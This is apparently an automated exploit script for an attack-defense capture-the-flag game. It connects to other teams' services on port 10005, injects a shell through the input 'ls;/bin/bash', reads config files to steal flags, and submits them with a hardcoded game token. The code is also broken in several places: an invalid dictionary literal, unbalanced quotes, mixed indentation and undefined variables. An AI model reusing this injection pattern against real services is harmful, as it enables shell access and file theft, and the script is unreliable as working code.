import os
import socket
import select
import sys
import threading
import hashlib
import time
import re
import json
import random
import string
from pwn import *
from timeout import timeout
from collections import defaultdict

import swpag_client
import requests
from bs4 import BeautifulSoup
from multiprocessing import Process, Manager


game_link = 'http://34.195.187.175/'
game_token = 'd3711768d3edb770ab8da755709d176f'


service_port = [10005]
other_teams = []
vulnerability = {[10005: True]}

def vulnerability1(host, port, flag_id):
    c = remote(host,port)
    c.recvline()
    c.recvline()
    c.recvline()
    c.recvline()
    c.recvline()
    c.sendline("d")
    c.recvline()
    c.sendline("value1")
    c.recvline()
    c.sendline("ls;/bin/bash")
    c.recvline()
    c.sendline("s")
    data=c.recvline()
    data=c.recvline()
    filename= data[-8:-2].decode("utf-8")
    data=c.recvline()
    data=c.recvline()
    c.sendline("l")
    c.recvline()
    c.sendline("config_"+filename)
    data = c.recvline()
    c.sendline("cat config_"+ flag_id )

    data = c.recvline()
    data = c.recvline()

    c.close()
    return data[-17:-1].decode('utf-8')

map = {10005: [vulnerability1]}


team = swpag_client.Team(game_link, game_token)

def launch_vul(id, targ, svc):
	team_name = targ["team_name"]
    hostname = targ["hostname"]
    port = targ["port"]
    flag_id = targ["flag_id"]
    if other_teams and team_name not in other_teams:
    	return; # Don't do anything here

    for i, buf in enumerate(vulnerability[svcid]):
        if not enabled:
            continue

        buf1 = map[svcid][i]
        flag = buf1(hostname, port, flag_id)
        if flag is not None:
            print("Stole flag {0}!".format(flag))
            flags.add((team_name, flag))
            break
        else:
            print("Oops looks like other teams have patched")

tick1=0
def getServices():
    services = team.get_service_list()


def tick_loop(tick1):
    while True:
        tick = team.get_tick_info()
        if tick["tick_id"] > tick1:
            wait = True
            if tick1 == 0:
                wait = False
            tick1 = tick["tick_id"]
            print("Tick1", tick1)
            if wait:
                time.sleep(10)
        else:
            time.sleep(10)
            continue
        flags = set()
        for svc in services:
            svcid = svc["service_id"]
            svcport = svc["port"]
        targets = team.get_targets(svcid)

        for targ in targets:
                team_name = targ["team_name"]
                hostname = targ["hostname"]
                port = targ["port"]
                flag_id = targ["flag_id"]

                if other_teams and team_name not in other_teams:
                    continue
                for i, buf in enumerate(vulnerability[svcport]):
                    if not buf:
                        continue
                    flag = map[svcport][i](hostname, port, flag_id)
                    if flag is not None:
                        print("Stole flag {0}!".format(flag))
                        flags.add((team_name, flag))
                        break
                    else:
                        print("Error!"")

        if flags:
            pctflist = list(flags)
            flaglist = [str(f[1]) for f in pctflist]
            print(flaglist)
            final_flag = team.submit_flag(flaglist)
            temp1 = {}
            for i, (t, flag) in enumerate(pctflist):
                temp1[t] = (flag, final_flag[i])
            print("All flags here:", temp1)
        else:
            print("Error - no flags")


        t_info = team.get_tick_info()
        wait = int(info["approximate_seconds_left"])


while True:
    while True:
        try:
            getServices()
            tick_loop(tick1)
        except Exception as e:
            time.sleep(5)

        
